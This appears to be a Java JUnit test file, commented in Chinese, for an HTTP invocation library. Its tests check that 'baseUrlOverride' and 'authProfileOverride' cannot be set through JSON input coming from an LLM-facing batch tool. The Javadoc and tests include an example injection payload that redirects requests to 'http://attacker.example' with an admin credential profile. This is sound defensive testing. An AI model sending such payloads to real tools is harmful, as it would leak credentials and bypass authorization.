package cn.wubo.loom.http.core.invoke;

import cn.wubo.loom.http.core.util.JsonMappers;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.LinkedHashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;

/**
 * 锁定一条<b>安全边界</b>:{@code InvokeRequest} 的两个路由 override 字段
 * ({@code baseUrlOverride} / {@code authProfileOverride})<b>不可从 JSON 绑定</b>。
 *
 * <p><b>为什么这条必须用测试锁死</b>:deep audit(aud_6fZ4zETVSf)发现,D1 的修复把路由参数
 * 放到了 {@code InvokeRequest} 上,而这个对象会被
 * {@code mapper().convertValue(userJson, InvokeRequest.class)} 直接绑定 ——
 * {@code LoomHttpMcpService.convertOperations}(loom-http-mcp 的 {@code http_batch} 工具,
 * {@code LoomHttpMcpService.java:85})就是这条路径,输入是 LLM/用户给的原始 JSON。
 * {@code DefaultHttpTool.toInvokeRequest}(loom-agent 侧的 {@code httpBatch})**不走**这条路 ——
 * 它逐字段显式 set(实测 {@code DefaultHttpTool.java:173}),天然碰不到 override setter;
 * 本仓生产代码里 {@code convertValue(..., InvokeRequest.class)} 只有上面那一处。
 * Jackson 按 setter 名匹配属性,所以只要 override 字段可绑定,调用方就能写:
 *
 * <pre>
 * {"system":"prod-system","method":"GET","path":"/x",
 *  "baseUrlOverride":"http://attacker.example","authProfileOverride":"internal-admin"}
 * </pre>
 *
 * 结果是<b>已授权 system 的流量被改道到任意主机,并注入任意已注册 profile 的凭据</b>
 * (该 profile 的 allowedDomains 白名单也随之替换)—— 凭据外泄 + 越权。
 *
 * <p>因此两个字段带 {@code @JsonIgnore}:唯一写入方是进程内的 ad-hoc 调用代码。
 * 这是安全约束,不是风格选择,所以用测试钉死,防止有人为了"方便外部传参"去掉注解。
 */
class InvokeRequestBindingTest {

    private static Map<String, Object> map(Object... kv) {
        Map<String, Object> m = new LinkedHashMap<>();
        for (int i = 0; i < kv.length; i += 2) {
            m.put((String) kv[i], kv[i + 1]);
        }
        return m;
    }

    @Test
    @DisplayName("convertValue 不得把 JSON 里的 baseUrlOverride 绑进请求")
    void baseUrlOverrideIsNotBindableFromJson() {
        InvokeRequest req = JsonMappers.mapper().convertValue(
                map("system", "prod-system", "method", "GET", "path", "/x",
                    "baseUrlOverride", "http://attacker.example"),
                InvokeRequest.class);

        assertEquals("prod-system", req.getSystem(), "正常字段仍应正常绑定");
        assertNull(req.getBaseUrlOverride(),
                "baseUrlOverride 绝不能从 JSON 绑定 —— 否则调用方可把已授权 system 改道到任意主机");
    }

    @Test
    @DisplayName("convertValue 不得把 JSON 里的 authProfileOverride 绑进请求")
    void authProfileOverrideIsNotBindableFromJson() {
        InvokeRequest req = JsonMappers.mapper().convertValue(
                map("system", "prod-system", "method", "GET", "path", "/x",
                    "authProfileOverride", "internal-admin-profile"),
                InvokeRequest.class);

        assertEquals("prod-system", req.getSystem());
        assertNull(req.getAuthProfileOverride(),
                "authProfileOverride 绝不能从 JSON 绑定 —— 否则调用方可换上更高权限的 profile 凭据");
    }

    @Test
    @DisplayName("两个 override 同时出现在批量 operation 里也不得生效")
    void bothOverridesAreIgnoredInBatchShapedInput() {
        // 这正是 http_batch / httpBatch 的输入形状:一条 operation 是一个 JSON map。
        InvokeRequest req = JsonMappers.mapper().convertValue(
                map("system", "prod-system", "method", "POST", "path", "/pay",
                    "body", map("amount", 100),
                    "baseUrlOverride", "http://attacker.example",
                    "authProfileOverride", "internal-admin-profile"),
                InvokeRequest.class);

        assertNull(req.getBaseUrlOverride());
        assertNull(req.getAuthProfileOverride());
        assertEquals("/pay", req.getPath(), "同一 map 里的正常字段不受影响");
    }

    @Test
    @DisplayName("程序内 setter 仍然可用 —— ad-hoc 调用方必须能设置 override")
    void programmaticSettersStillWork() {
        // 反向锁:@JsonIgnore 只挡反序列化,不能顺手把功能也关掉。
        InvokeRequest req = new InvokeRequest();
        req.setSystem("_ad_hoc");
        req.setBaseUrlOverride("https://api.example.com");
        req.setAuthProfileOverride("some-profile");

        assertEquals("https://api.example.com", req.getBaseUrlOverride());
        assertEquals("some-profile", req.getAuthProfileOverride());
    }
}